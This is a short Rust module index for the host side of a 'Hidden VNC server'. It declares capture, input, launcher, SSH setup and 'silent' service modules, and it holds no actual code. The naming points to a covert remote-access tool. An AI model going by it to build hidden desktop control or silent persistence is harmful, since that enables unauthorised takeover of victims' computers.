//! Host-side components for Hidden VNC server

pub mod desktop;
pub mod launcher;
pub mod capture;
pub mod capture_extensions;
pub mod capture_advanced;  // Option C: Advanced capture methods
pub mod server;
pub mod input;
pub mod input_improved;
pub mod ssh_setup;
pub mod service;
pub mod silent_service;

pub use desktop::*;
pub use launcher::*;
pub use capture::*;
pub use capture_extensions::*;
pub use capture_advanced::*;  // Export Option C functions
pub use server::*;
pub use input::*;
pub use input_improved::*;
pub use ssh_setup::*;
pub use service::*;
pub use silent_service::*;